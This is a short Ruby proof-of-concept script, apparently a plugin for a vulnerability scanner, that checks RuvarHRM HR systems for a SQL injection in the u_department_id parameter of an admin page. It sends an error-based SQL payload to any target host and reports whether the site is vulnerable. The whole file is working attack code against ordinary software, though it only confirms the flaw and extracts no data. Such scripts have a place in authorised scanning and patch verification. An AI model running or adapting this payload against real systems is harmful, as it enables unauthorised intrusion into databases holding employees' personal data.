#-*- coding: utf-8 -*-
#file:ruvar_hrm_sql_injection.rb

require 'net/http'

class Vuln
	def initialize
		@info				= Hash.new
		@retn				= Hash.new
		@info['vuln_name']	= 'RuvarHRM人力资源管理系统SQL注入漏洞'
		@info['vuln_type']	= 'web'
		@info['vuln_date']	= '2016-03-23'
		@info['vuln_refr']	= 'http://www.wooyun.org/bugs/wooyun-2010-0152706'
		@info['vuln_desc']	= 'RuvarHRM人力资源管理系统/RuvarHRM/admin/accounts_list.aspx的u_department_id=参数过滤不严导致SQL注入'
		@retn['vuln_info']	= @info
		@retn['vuln_vrfy']	= false
		@retn['vuln_data']	= ''
	end

	def verify( target )
		target = "http://#{target}/RuvarHRM/admin/accounts_list.aspx"
		payload = "?u_department_id='and replace('AAAAATTTTTAAAAAAA','A','B') =0--"
		resp = Net::HTTP.get_response( URI(target+payload) )
		if resp.body.include?"BBBBBTTTTTBBBBBBB"
			@retn['vuln_vrfy']	= true
			puts "漏洞存在!\n#{target+payload}"
			@retn['vuln_data'] = "#{target+payload}"
		end
	end

	def ret()
		return @retn['vuln_vrfy']? @retn : nil
	end
end
